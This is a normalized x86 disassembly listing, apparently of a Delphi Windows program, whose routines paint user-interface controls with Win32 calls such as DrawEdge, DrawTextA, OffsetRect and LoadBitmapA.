mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41d494
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41d4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453093
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404354
push eax
mov eax [ ebp - 0xc ]
call sub_404554
push eax
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d1d4
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404354
push eax
mov eax [ ebp - 0xc ]
call sub_404554
push eax
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41d1d4
mov eax 0xff00000d
call sub_41cd14
mov esi eax
mov eax 0xff000010
call sub_41cd14
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d1d4
jmp r-xdata
sub_4530f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4539e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d9c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d1d4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4044a0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d9c8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44fc94
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e234
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d9c8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45353f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423640
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41d1d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44fc94
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d9c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4246e4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d99c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41df24
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4501ac
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d9c8
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ea8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d4a0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e234
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41dcc0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41d1d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403344
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e234
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ea8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4539e7
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_451f6c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ea8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_453a00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_454308
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d9c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d1d4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4044a0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d9c8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44fc94
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e234
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
